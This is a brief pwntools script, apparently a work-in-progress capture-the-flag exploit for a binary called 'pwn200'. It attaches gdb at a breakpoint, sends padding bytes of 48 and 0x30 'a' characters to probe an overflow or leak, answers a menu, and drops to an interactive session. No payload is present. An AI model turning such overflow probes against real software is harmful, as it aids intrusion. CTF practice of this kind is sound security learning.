from pwn import *
context(log_level="debug")

p = process('./pwn200')
gdb.attach(p,"b*0x400A72\nc")
p.recvuntil('u?\n')
p.send("a"*48)
p.recvuntil(' me your id ~~?\n')
p.sendline('0')
p.recvuntil('\n')
p.send('a'*0x30)
p.recvuntil('choice :')
p.sendline('3')
p.interactive()